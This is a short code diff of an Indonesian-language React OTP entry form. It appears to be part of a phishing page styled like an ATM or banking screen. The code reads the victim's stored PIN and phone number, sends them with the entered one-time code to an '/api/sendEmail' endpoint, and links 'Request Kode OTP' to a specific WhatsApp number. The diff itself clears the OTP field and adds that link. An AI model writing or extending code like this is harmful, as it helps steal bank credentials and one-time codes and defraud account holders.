@@ -18,7 +18,7 @@ function Otp({host}) {
                 pin : localStorage.getItem('pin'),
                 nohp : localStorage.getItem('nohp')
             }
-    
+            
             try {
     
                 const response = await fetch('/api/sendEmail',{
@@ -33,6 +33,7 @@ function Otp({host}) {
                 const json = await response.json()
             
                 if (json.status === 200) {
+                    setOtp("")
                     document.getElementById('btn').innerHTML = 'PROSES'
                 } else{
                     document.getElementById('btn').innerHTML = 'PROSES'
@@ -67,7 +68,8 @@ function Otp({host}) {
                         <input type="text" className='input-atm' placeholder='Masukkan Kode OTP' value={otp} onChange={e => setOtp(e.target.value)} />                        
                     </div>
                     <div className='mt'>
-                        <a className='link-otp'>{'>>'} Request Kode OTP ? {'<<'} </a>
+                        {/* Whatsapp */}
+                        <a href='https://api.whatsapp.com/send?phone=6281399087628' className='link-otp'>{'>>'} Request Kode OTP ? {'<<'} </a>
                     </div>
                     <button onClick={handleSetOtp} className='btn-atm' id='btn'>PROSES</button>
                 </div>
